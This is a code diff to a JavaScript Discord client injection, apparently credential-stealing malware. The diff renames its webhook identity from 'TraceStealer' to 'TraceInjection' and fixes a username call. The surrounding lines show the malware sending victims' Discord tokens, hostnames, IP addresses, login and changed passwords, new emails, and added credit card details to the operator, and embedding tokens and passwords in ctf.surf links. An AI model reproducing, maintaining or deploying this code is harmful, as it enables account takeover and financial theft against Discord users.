@@ -114,14 +114,14 @@ async function firstTime() {
             fs.rmdirSync(path.join(__dirname, "init"));
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "TraceStealer",
+                    username: "TraceInjection",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized (User not Logged in)",
                         color: config["embed-color"],
                         fields: [{
-                            name: "Info",
-                            value: `\`\`\`User: \n${os.hostname()}/${os.username}\nInjection Location: \n${__dirname}\n\`\`\``,
+                           name: "<:a_:1116251643248386050> Info",
+                            value: `\`\`\`User: \n${os.hostname()}/${os.username()}\nInjection Location: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }],
                         author: {
@@ -136,15 +136,15 @@ async function firstTime() {
             } else {
                 var b = await getUserInfo(token)
                 var c = {
-                    username: "TraceStealer",
+                    username: "TraceInjection",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "<:a_:1116250073232318516> Discord Initalized",
                         description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
-                            name: "Info",
-                            value: `\`\`\`User: \n${os.hostname()}/${os.username}\nInjection Location: \n${__dirname}\n\`\`\``,
+                           name: "<:a_:1116251643248386050> Info",
+                            value: `\`\`\`User: \n${os.hostname()}/${os.username()}\nInjection Location: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }, {
                             name: "<:a_:1115066752024444980> Username",
@@ -189,14 +189,14 @@ async function firstTime() {
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
                 var c = {
-                    username: "TraceStealer",
+                    username: "TraceInjection",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User log out (User not Logged in before)",
                         color: config["embed-color"],
                         fields: [{
-                            name: "Info",
-                            value: `User: \n${os.hostname()}.${os.username}\n\`\`\`Injection Location: \n${__dirname}\n\`\`\``,
+                           name: "<:a_:1116251643248386050> Info",
+                            value: `User: \n${os.hostname()}.${os.username()}\n\`\`\`Injection Location: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }],
                         author: {
@@ -211,15 +211,15 @@ async function firstTime() {
             } else {
                 const b = await getUserInfo(token);
                 var c = {
-                    username: "TraceStealer",
+                    username: "TraceInjection",
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User got logged out",
                         description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
-                            name: "Info",
-                            value: `\`\`\`User: \n${os.hostname()}/${os.username}\nInjection Location: \n${__dirname}\n\`\`\``,
+                           name: "<:a_:1116251643248386050> Info",
+                            value: `\`\`\`User: \n${os.hostname()}/${os.username()}\nInjection Location: \n${__dirname}\n\`\`\``,
                             inline: !1
                         }, {
                             name: "<:a_:1115066752024444980> Username",
@@ -312,15 +312,15 @@ async function userLogin(password, email, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "TraceStealer",
+        username: "TraceInjection",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "User Login",
             description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password})`,
             "color": config['embed-color'],
             "fields": [{
-                name: "Info",
-                value: `\`\`\`User: \n${os.hostname()}/${os.username}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
+               name: "<:a_:1116251643248386050> Info",
+                value: `\`\`\`User: \n${os.hostname()}/${os.username()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                 inline: !1
             }, {
                 name: "<:a_:1115066752024444980> Username",
@@ -421,14 +421,14 @@ async function emailChanged(password, newEmail, token) {
 
 
     var params = {
-        username: "TraceStealer",
+        username: "TraceInjection",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Email Changed",
             description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password}\n${newEmail})`,
             "color": config['embed-color'],
             "fields": [{
-                name: "Info",
+               name: "<:a_:1116251643248386050> Info",
                 value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\`\`\``,
                 inline: !1
             }, {
@@ -510,14 +510,14 @@ async function passwordChanged(oldPassword, newPassword, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "TraceStealer",
+        username: "TraceInjection",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Password Changed",
             description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${newPassword})`,
             "color": config['embed-color'],
             "fields": [{
-                name: "Info",
+               name: "<:a_:1116251643248386050> Info",
                 value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                 inline: !1
             }, {
@@ -621,14 +621,14 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
     var friends = await getRelationships(token);
 
     var params = {
-        username: "TraceStealer",
+        username: "TraceInjection",
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Credit Card",
             description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
             "color": config['embed-color'],
             "fields": [{
-                name: "Info",
+               name: "<:a_:1116251643248386050> Info",
                 value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
                 inline: !1
             }, {
